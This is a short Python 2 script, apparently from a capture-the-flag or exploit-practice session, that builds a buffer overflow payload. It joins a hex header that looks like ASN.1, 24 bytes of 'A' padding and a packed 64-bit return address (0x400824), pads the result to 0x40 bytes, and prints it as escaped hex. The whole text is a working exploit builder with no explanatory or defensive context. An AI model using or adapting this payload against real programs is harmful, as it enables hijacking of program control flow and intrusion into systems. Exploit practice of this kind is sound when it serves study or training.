import struct
result = r""
data = "301f0201020438"
data
data = data.decode("hex")
data
data += 24*"A"
data
data += struct.pack("<Q", 0x0000000000400824)
data = data.ljust(0x40, "$")
data_encode = data.encode("hex")
data_encode
for x in range(0, len(data_encode), 2):
	result += r"\x" + data_encode[x:x+2]
result